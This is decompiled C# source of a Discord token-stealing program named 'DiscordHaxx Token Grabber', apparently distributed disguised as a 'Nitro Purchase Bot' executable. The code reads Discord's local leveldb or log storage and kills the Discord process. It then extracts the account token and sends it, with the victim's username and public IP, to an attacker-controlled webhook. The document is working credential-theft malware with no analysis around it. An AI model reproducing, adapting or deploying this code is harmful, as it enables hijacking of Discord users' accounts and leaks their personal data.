// Decompiled with JetBrains decompiler
// Type: DHTokenGrabber.Program
// Assembly: DHTokenGrabber, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DA47AD1B-F275-4D29-9279-8EA7ACDC786C
// Assembly location: C:\Users\lukumiya\Desktop\Nitro Purchase Bot\Nitro Purchase Bot\[Nitro Purchase Bot].exe

using System;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Threading;

namespace DHTokenGrabber
{
  internal class Program
  {
    private static void Main(string[] args)
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
      if (!Grabber.FindLdb(ref path) && !Grabber.FindLog(ref path))
        Program.SendWH("No valid .ldb or .log file found");
      foreach (Process process in Process.GetProcessesByName("Discord"))
        process.Kill();
      Thread.Sleep(100);
      string token = Grabber.GetToken(path, path.EndsWith(".log"));
      if (token == "")
        token = "Not found";
      Program.SendWH(token);
    }

    private static void SendWH(string token)
    {
      HttpClient httpClient = new HttpClient();
      MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
      multipartFormDataContent.Add((HttpContent) new StringContent("DiscordHaxx Token Grabber"), "username");
      multipartFormDataContent.Add((HttpContent) new StringContent("https://media.discordapp.net/attachments/536613741266075649/539446253730398218/discordhaxx_logo.png?width=300&height=300"), "avatar_url");
      multipartFormDataContent.Add((HttpContent) new StringContent("Token by " + Environment.UserName + " on " + Program.GetIP() + "\r\nResult: " + token), "content");
      try
      {
        HttpResponseMessage result = httpClient.PostAsync(Settings.Webhook, (HttpContent) multipartFormDataContent).Result;
      }
      catch (Exception ex)
      {
      }
    }

    private static string GetIP()
    {
      try
      {
        return new HttpClient().GetStringAsync("https://wtfismyip.com/text").Result;
      }
      catch (WebException ex)
      {
        return "Unable to get IP";
      }
    }
  }
}
